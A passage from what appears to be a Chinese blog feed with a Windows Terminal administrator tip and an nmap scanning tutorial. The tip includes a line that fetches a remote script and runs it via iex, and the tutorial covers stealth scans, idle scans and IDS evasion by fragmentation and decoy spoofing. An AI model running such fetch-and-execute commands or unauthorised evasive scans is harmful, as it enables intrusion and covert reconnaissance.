        <content type="html"><![CDATA[<h1 id="windows-terminal设置管理员"><a href="#windows-terminal设置管理员" class="headerlink" title="windows terminal设置管理员"></a>windows terminal设置管理员</h1><p>现在windows基本上都内置了，没有就去下载</p><h2 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h2><ol><li><p>添加一个配置文件</p><p>设置-&gt;添加一个新的配置文件，内容如图</p><p><img src="https://images.dadream.eu.org/images/2024/07/f7bb93dc06ec38d4d29c7a9c3c4b1934.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell.exe <span class="token parameter variable">-command</span> Start-Process <span class="token parameter variable">-Verb</span> RunAs <span class="token punctuation">\</span>"wt<span class="token punctuation">\</span>"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>原理就是通过在powershell中以管理员方式再次打开Windows PowerShell，上面的命令行的作用就是这个，所以不能把这个配置文件设置为默认，不然会无限重启，手贱试了的就重启电脑，下次打开wt，点否，然后把配置改回来，所以这个有点小鸡肋，其中命令行<strong>wt</strong>可以换成加过环境变量的其他程序，当然你也可以写绝对路径</p></li><li><p>利用其他程序来实现</p><p>这个安全性不得而知，因为这个程序能获取你的管理员权限，当然自己人用用还是没啥问题，它类似linux的sudo</p><p>安装，运行命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">PowerShell <span class="token parameter variable">-Command</span> <span class="token string">"Set-ExecutionPolicy RemoteSigned -scope Process; iwr -useb https://raw.githubusercontent.com/gerardog/gsudo/master/installgsudo.ps1 | iex"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>询问是否使用别名，看自己的意向</p><p>然后添加如下配置</p><p><img src="https://images.dadream.eu.org/images/2024/07/1e189d37b20bc7e2a7dc9a512693f23c.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gsudo.exe powershell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>和上面一样意思</p></li><li><p>运行框启动</p><p>win+x打开运行窗口，输入wt（你想要运行的程序），确认同时按着ctrl+shift时，点击确定，便能以管理员方式运行</p><p>这个可以说最简单</p></li><li><p>写批处理文件</p><p>先一个bat文件，命名随意</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">powershell.exe Start-Process <span class="token parameter variable">-Verb</span> RunAs <span class="token punctuation">\</span>"wt<span class="token punctuation">\</span>"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在写一个vbs文件，命名随意</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Set ws <span class="token operator">=</span> CreateObject<span class="token punctuation">(</span><span class="token string">"Wscript.Shell"</span><span class="token punctuation">)</span>   ws.run <span class="token string">"cmd /c wta.bat"</span>,vbhide<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>wta.bat是我的bat文件名，放在同一个目录，使用时打开vbs文件，我感觉这样最奈斯</p></li></ol><h2 id="win11"><a href="#win11" class="headerlink" title="win11"></a>win11</h2><p>右击开始-&gt;Windows终端（管理员）</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>namp使用教程</title>
      <link href="/2021/12/25/nmap/"/>
      <url>/2021/12/25/nmap/</url>
      
        <content type="html"><![CDATA[<h1 id="namp使用教程"><a href="#namp使用教程" class="headerlink" title="namp使用教程"></a>namp使用教程</h1><p>nmap是一个网络连接端扫描软件，用来扫描网上电脑开放的网络连接端。确定哪些服务运行在哪些连接端，并且推断计算机运行哪个操作系统。它是网络管理员必用的软件之一，以及用以评估网络系统安全。我们一般用命令行形式的脚本，下载：<a href="https://nmap.org/">Nmap: the Network Mapper - Free Security Scanner</a></p><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><p>主机发现有时候也叫做ping扫描，但它远远超越用世人皆知的ping工具 发送简单的ICMP回声请求报文。用户完全可以通过使用列表扫描(<code>-sL</code>)或者 通过关闭ping (<code>-P0</code>)跳过ping的步骤，也可以使用多个端口把TCP SYN/ACK，UDP和ICMP 任意组合起来玩一玩。这些探测的目的是获得响应以显示某个IP地址是否是活动的(正在被某主机或者网络设备使用)。 </p><h4 id="常规扫描"><a href="#常规扫描" class="headerlink" title="常规扫描"></a>常规扫描</h4><p>简单的在命令后加ip地址，可以进行常规扫描，查看主机是否存活以及开放的端口。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="列表扫描"><a href="#列表扫描" class="headerlink" title="列表扫描"></a>列表扫描</h4><p>列表扫描是主机发现的退化形式，它仅仅列出指定网络上的每台主机， 不发送任何报文到目标主机。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sL</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="Ping-扫描"><a href="#Ping-扫描" class="headerlink" title="Ping 扫描"></a>Ping 扫描</h4><p>类似于Ping命令，仅执行Ping扫描，可以快速发现主机是否存活。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sn</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="免Ping扫描"><a href="#免Ping扫描" class="headerlink" title="免Ping扫描"></a>免Ping扫描</h4><p>穿透防火墙，避免被防火墙发现</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-P0</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-SYN-Ping-扫描"><a href="#TCP-SYN-Ping-扫描" class="headerlink" title="TCP SYN Ping 扫描"></a>TCP SYN Ping 扫描</h4><p>通常情况下，Nmap默认Ping扫描是使用TCP ACK和ICMP Echo请求对目标进行是否存活的响应，当目标主机的防火墙阻止这些请求时，可以使用TCP Syn Ping扫描。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PS</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-ACK-Ping-扫描"><a href="#TCP-ACK-Ping-扫描" class="headerlink" title="TCP ACK Ping 扫描"></a>TCP ACK Ping 扫描</h4><p>使用 <code>-PA</code> 选项可以进行 TCP ACK Ping 扫描，它与 TCP Syn Ping 是非常类似的，唯一的区别是设置TCP的标志位是ACK而不是SYN，使用这种方式扫描可以探测组织SYN包或ICMP Echo请求的主机。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PA</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="UDP-Ping-扫描"><a href="#UDP-Ping-扫描" class="headerlink" title="UDP Ping 扫描"></a>UDP Ping 扫描</h4><p><code>-PU</code> 选项是发送一个空的UDP报文到指定端口，如果目标主机响应则返回一个ICMP端口不可达错误，如果目标主机不是存活状态则会返回各种ICMP报错信息。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PU</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ICMP-Ping-Types-扫描"><a href="#ICMP-Ping-Types-扫描" class="headerlink" title="ICMP Ping Types 扫描"></a>ICMP Ping Types 扫描</h4><h5 id="ICMP-Echo-方式扫描"><a href="#ICMP-Echo-方式扫描" class="headerlink" title="ICMP Echo 方式扫描"></a>ICMP Echo 方式扫描</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PE</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="使用ICMP时间戳Ping扫描"><a href="#使用ICMP时间戳Ping扫描" class="headerlink" title="使用ICMP时间戳Ping扫描"></a>使用ICMP时间戳Ping扫描</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PP</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="使用ICMP地址掩码Ping扫描"><a href="#使用ICMP地址掩码Ping扫描" class="headerlink" title="使用ICMP地址掩码Ping扫描"></a>使用ICMP地址掩码Ping扫描</h5><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PM</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ARP-Ping-扫描"><a href="#ARP-Ping-扫描" class="headerlink" title="ARP Ping 扫描"></a>ARP Ping 扫描</h4><p>这个选项通常用在扫描局域网时，在本地局域网中防火墙不会禁止ARP请求，这就使它的扫描更加高效。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PR</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="禁止方向域名解析"><a href="#禁止方向域名解析" class="headerlink" title="禁止方向域名解析"></a>禁止方向域名解析</h4><p>告诉Nmap永不对它发现的活动IP地址进行反向域名解析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-n</span> <span class="token parameter variable">-sL</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="方向域名解析"><a href="#方向域名解析" class="headerlink" title="方向域名解析"></a>方向域名解析</h4><p>告诉Nmap永远对目标IP地址作反向域名解析</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-R</span> <span class="token parameter variable">-sL</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="使用系统域名解析系统"><a href="#使用系统域名解析系统" class="headerlink" title="使用系统域名解析系统"></a>使用系统域名解析系统</h4><p>Nmap通过直接发送查询到您的主机上配置的域名服务器来解析域名。为了提高性能，许多请求 (一般几十个 ) 并发执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --system-dns <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="路由跟踪"><a href="#路由跟踪" class="headerlink" title="路由跟踪"></a>路由跟踪</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--traceroute</span> <span class="token parameter variable">-v</span> 域名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="SCTP-INIT-Ping-扫描"><a href="#SCTP-INIT-Ping-扫描" class="headerlink" title="SCTP INIT Ping 扫描"></a>SCTP INIT Ping 扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-PY</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>扫描端口开放状态，端口分成六个状态: <code>open</code>(开放的)， <code>closed</code>(关闭的)，<code>filtered</code>(被过滤的)， <code>unfiltered</code>(未被过滤的)， <code>open|filtered(开放或者被过滤的)</code>，或者 <code>closed|filtered(关闭或者被过滤的)</code>。</p><h4 id="扫描指定端口"><a href="#扫描指定端口" class="headerlink" title="扫描指定端口"></a>扫描指定端口</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-p</span> port<span class="token punctuation">(</span><span class="token number">80</span><span class="token punctuation">)</span> <span class="token function">ip</span>nmap <span class="token parameter variable">-p</span> <span class="token number">80</span>-100 <span class="token function">ip</span>nmap <span class="token parameter variable">-p</span> T:80,U:445 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="快速扫描"><a href="#快速扫描" class="headerlink" title="快速扫描"></a>快速扫描</h4><pre class="line-numbers language-none"><code class="language-none">nmap -F ip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="不要按随机顺序扫描端口"><a href="#不要按随机顺序扫描端口" class="headerlink" title="不要按随机顺序扫描端口"></a>不要按随机顺序扫描端口</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-r</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="时序扫描"><a href="#时序扫描" class="headerlink" title="时序扫描"></a>时序扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -T<span class="token punctuation">(</span><span class="token number">0</span>-5<span class="token punctuation">)</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="扫描最有用的前100个端口"><a href="#扫描最有用的前100个端口" class="headerlink" title="扫描最有用的前100个端口"></a>扫描最有用的前100个端口</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --top-ports <span class="token number">100</span> <span class="token function">ip</span>   <span class="token punctuation">(</span>扫描最有用的前100个端口<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-SYN-扫描-（高效的扫描方式）"><a href="#TCP-SYN-扫描-（高效的扫描方式）" class="headerlink" title="TCP SYN 扫描 （高效的扫描方式）"></a>TCP SYN 扫描 （高效的扫描方式）</h4><p>它常常被称为半开放扫描， 因为它不打开一个完全的TCP连接。它发送一个SYN报文， 就像您真的要打开一个连接，然后等待响应。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-连接扫描"><a href="#TCP-连接扫描" class="headerlink" title="TCP 连接扫描"></a>TCP 连接扫描</h4><p>当SYN扫描不能用时，TCP Connect()扫描就是默认的TCP扫描。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="UDP-连接扫描"><a href="#UDP-连接扫描" class="headerlink" title="UDP 连接扫描"></a>UDP 连接扫描</h4><p>UDP扫描发送空的(没有数据)UDP报头到每个目标端口。 如果返回ICMP端口不可到达错误， 该端口是<code>closed</code>(关闭的)。 其它ICMP不可到达错误表明该端口是<code>filtered</code>(被过滤的)。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sU</span> <span class="token parameter variable">-p</span> <span class="token number">80</span>-100 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="隐蔽扫描"><a href="#隐蔽扫描" class="headerlink" title="隐蔽扫描"></a>隐蔽扫描</h4><p>如果扫描系统遵循该RFC，当端口关闭时，任何不包含SYN，RST，或者ACK位的报文会导致 一个RST返回，而当端口开放时，应该没有任何响应。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sN</span> ip<span class="token punctuation">(</span>NULL扫描<span class="token punctuation">)</span>nmap <span class="token parameter variable">-sF</span> ip<span class="token punctuation">(</span>FIN扫描<span class="token punctuation">)</span>nmap <span class="token parameter variable">-sX</span> ip<span class="token punctuation">(</span>Xmas扫描<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="TCP-ACK-扫描"><a href="#TCP-ACK-扫描" class="headerlink" title="TCP ACK 扫描"></a>TCP ACK 扫描</h4><p> 它用于发现防火墙规则，确定它们是有状态的还是无状态的，哪些端口是被过滤的。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sA</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-窗口扫描"><a href="#TCP-窗口扫描" class="headerlink" title="TCP 窗口扫描"></a>TCP 窗口扫描</h4><p>通过检查返回的RST报文的TCP窗口域做到这一点。 在某些系统上，开放端口用正数表示窗口大小(甚至对于RST报文) 而关闭端口的窗口大小为0。因此，当收到RST时，窗口扫描不总是把端口标记为 <code>unfiltered</code>， 而是根据TCP窗口值是正数还是0，分别把端口标记为<code>open</code>或者 <code>closed</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sW</span> <span class="token parameter variable">-v</span> <span class="token parameter variable">-F</span>  <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="TCP-Maimon-扫描"><a href="#TCP-Maimon-扫描" class="headerlink" title="TCP Maimon 扫描"></a>TCP Maimon 扫描</h4><p>和Null，FIN，以及Xmas扫描完全一样，除了探测报文是FIN/ACK。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sM</span> <span class="token parameter variable">-T4</span>  <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="自定义-扫描"><a href="#自定义-扫描" class="headerlink" title="自定义 扫描"></a>自定义 扫描</h4><p><code>--scanflags</code>选项允许您通过指定任意TCP标志位来设计您自己的扫描。<code>--scanflags</code>选项可以是一个数字标记值如9 (PSH和FIN)，可以设置 TCP扫描类型(如<code>-sA</code>或者<code>-sF</code>)，如–scanflags URGACKPSHRSTSYNFIN</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sT</span> <span class="token parameter variable">--scanflags</span> SYNURG <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="空闲-扫描-隐藏IP"><a href="#空闲-扫描-隐藏IP" class="headerlink" title="空闲 扫描( 隐藏IP )"></a>空闲 扫描( 隐藏IP )</h4><p>这种高级的扫描方法允许对目标进行真正的TCP端口盲扫描</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sI</span> www.0day.co:80 <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="IP协议-扫描"><a href="#IP协议-扫描" class="headerlink" title="IP协议 扫描"></a>IP协议 扫描</h4><p>IP 协议扫描可以让您确定目标机支持哪些IP协议 (TCP，ICMP，IGMP，等等)。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sO</span> <span class="token parameter variable">-T4</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="FTP弹跳扫描"><a href="#FTP弹跳扫描" class="headerlink" title="FTP弹跳扫描"></a>FTP弹跳扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-b</span> <span class="token operator">&lt;</span>ftp relay host<span class="token operator">&gt;</span> <span class="token punctuation">(</span>FTP弹跳扫描<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="服务和版本探测"><a href="#服务和版本探测" class="headerlink" title="服务和版本探测"></a>服务和版本探测</h3><p>把Nmap指向一个远程机器，它可能告诉你端口25/tcp，80/tcp，和53/udp是开放的。使用包含大约2,200个著名的服务的 <code>nmap-services</code>数据库， Nmap可以报告那些端口可能分别对应于一个邮件服务器 (SMTP)，web服务器(HTTP)，和域名服务器(DNS)。 </p><h4 id="版本探测"><a href="#版本探测" class="headerlink" title="版本探测"></a>版本探测</h4><p>打开版本探测</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token function">ip</span>nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">-A</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="全端口版本探测"><a href="#全端口版本探测" class="headerlink" title="全端口版本探测"></a>全端口版本探测</h4><p>指定<code>--allports</code>扫描所有端口</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--allports</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="设置扫描强度"><a href="#设置扫描强度" class="headerlink" title="设置扫描强度"></a>设置扫描强度</h4><p>被赋予较低值的探测报文对大范围的常见服务有效，而被赋予较高值的报文 一般没什么用。数值越高， 服务越有可能被正确识别。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-intensity <span class="token punctuation">(</span><span class="token number">0</span>-9<span class="token punctuation">)</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="轻量级扫描"><a href="#轻量级扫描" class="headerlink" title="轻量级扫描"></a>轻量级扫描</h4><p> <code>--version-intensity 2</code>的方便的别名。轻量级模式使版本扫描快许多</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-light <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="重量级扫描"><a href="#重量级扫描" class="headerlink" title="重量级扫描"></a>重量级扫描</h4><p><code>--version-intensity 9</code>的别名， 保证对每个端口尝试每个探测报文。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-all <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="获取详细版本信息"><a href="#获取详细版本信息" class="headerlink" title="获取详细版本信息"></a>获取详细版本信息</h4><p>Nmap打印出详细的关于正在进行的扫描的调试信息</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> --version-trace <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="RPC扫描"><a href="#RPC扫描" class="headerlink" title="RPC扫描"></a>RPC扫描</h4><p>它对所有被发现开放的TCP/UDP端口执行SunRPC程序NULL命令，来试图 确定它们是否RPC端口，如果是， 是什么程序和版本号。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sS</span> <span class="token parameter variable">-sR</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="操作系统探测"><a href="#操作系统探测" class="headerlink" title="操作系统探测"></a>操作系统探测</h3><p>Nmap发送一系列TCP和UDP报文到远程主机，检查响应中的每一个比特。 在进行一打测试如TCP ISN采样，TCP选项支持和排序，IPID采样，和初始窗口大小检查之后， Nmap把结果和数据库<code>nmap-os-fingerprints</code>中超过 1500个已知的操作系统的fingerprints进行比较，如果有匹配，就打印出操作系统的详细信息。 </p><h4 id="启用操作系统检测"><a href="#启用操作系统检测" class="headerlink" title="启用操作系统检测"></a>启用操作系统检测</h4><p>也可以使用<code>-A</code>来同时启用操作系统检测和版本检测。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="对指定的目标进行操作系统监测"><a href="#对指定的目标进行操作系统监测" class="headerlink" title="对指定的目标进行操作系统监测"></a>对指定的目标进行操作系统监测</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> --osscan-limit <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="推测系统并识别"><a href="#推测系统并识别" class="headerlink" title="推测系统并识别"></a>推测系统并识别</h4><p>当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> --osscan-guess/ <span class="token parameter variable">--fuzzy</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h3><h4 id="调整并行扫描组的大小"><a href="#调整并行扫描组的大小" class="headerlink" title="调整并行扫描组的大小"></a>调整并行扫描组的大小</h4><p><code>--max-hostgroup</code>选项用于说明使用最大的组，Nmap不 会超出这个大小。<code>--min-hostgroup</code>选项说明最小的组，Nmap 会保持组大于这个值</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --min-hostgroup <span class="token number">30</span> <span class="token function">ip</span>nmap --max-hostgroup <span class="token number">1024</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="调整探测报文的并行度"><a href="#调整探测报文的并行度" class="headerlink" title="调整探测报文的并行度"></a>调整探测报文的并行度</h4><p>这些选项控制用于主机组的探测报文数量，可用于端口扫描和主机发现。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --min-parallelism <span class="token number">100</span> <span class="token function">ip</span>nmap --max-parallelism <span class="token number">100</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="调整探测报文超时"><a href="#调整探测报文超时" class="headerlink" title="调整探测报文超时"></a>调整探测报文超时</h4><p>Nmap使用一个运行超时值来确定等待探测报文响应的时间，随后会放弃或重新发送探测报文。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --initial-rtt-timeout 100ms <span class="token function">ip</span>nmap --max-rtt-timeout 100ms <span class="token function">ip</span>nmap --min-rtt-timeout 100ms <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="放弃缓慢的目标主机"><a href="#放弃缓慢的目标主机" class="headerlink" title="放弃缓慢的目标主机"></a>放弃缓慢的目标主机</h4><p><code>--host-timeout</code>选项来说明等待的时间(毫秒)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --host-timeout 1800000ms <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="调整报文适合时间间隔"><a href="#调整报文适合时间间隔" class="headerlink" title="调整报文适合时间间隔"></a>调整报文适合时间间隔</h4><p>这个选项用于Nmap控制针对一个主机发送探测报文的等待时间(毫秒)</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap --scan-delay <span class="token function">ls</span> <span class="token function">ip</span>nmap --max-scan-delay <span class="token function">ls</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="设置时间模板"><a href="#设置时间模板" class="headerlink" title="设置时间模板"></a>设置时间模板</h4><p>往往选择合适参数的时间超过了所需优化的扫描时间，Nmap提供了一些简单的方法，使用6个时间模板，使用时采用<code>-T</code>选项及数字(0 - 5) 或名称。模板名称有paranoid (0)、sneaky (1)、polite (2)、normal(3)、 aggressive (4)和insane (5)。前两种模式用于IDS躲避，Polite模式降低了扫描 速度以使用更少的带宽和目标主机资源。默认模式为Normal，因此<code>-T3</code> 实际上是未做任何优化。Aggressive模式假设用户具有合适及可靠的网络从而加速 扫描。Insane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T</span> <span class="token operator">&lt;</span>Paranoid<span class="token operator">|</span>Sneaky<span class="token operator">|</span>Polite<span class="token operator">|</span>Normal<span class="token operator">|</span>Aggressive<span class="token operator">|</span>Insane<span class="token operator">&gt;</span><span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="防火墙-IDS躲避和哄骗"><a href="#防火墙-IDS躲避和哄骗" class="headerlink" title="防火墙/IDS躲避和哄骗"></a>防火墙/IDS躲避和哄骗</h3><h4 id="报文分段"><a href="#报文分段" class="headerlink" title="报文分段"></a>报文分段</h4><p><code>-f</code>选项要求扫描时(包挺ping扫描)使用小的IP包分段。其思路是将TCP头分段在几个包中，使得包过滤器、IDS以及其它工具的检测更加困难。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-f</span> <span class="token parameter variable">-v</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="指定偏移大小"><a href="#指定偏移大小" class="headerlink" title="指定偏移大小"></a>指定偏移大小</h4><p>使用<code>--mtu</code>选项可以自定义偏移的大小，使用时不需要<code>-f</code>，偏移量必须 是8的倍数。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">--mtu</span> <span class="token number">16</span> <span class="token function">ip</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="IP欺骗"><a href="#IP欺骗" class="headerlink" title="IP欺骗"></a>IP欺骗</h4><p>为使诱饵扫描起作用，需要使远程主机认为是诱饵在扫描目标网络。 IDS可能会报个某个IP的5-10个端口扫描，但并不知道哪个IP在扫描以及 哪些不是诱饵。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-D</span> RND:11 <span class="token function">ip</span>nmap <span class="token parameter variable">-D</span> ip1,ip2,ip3 ip1<span aria-hidden="true" 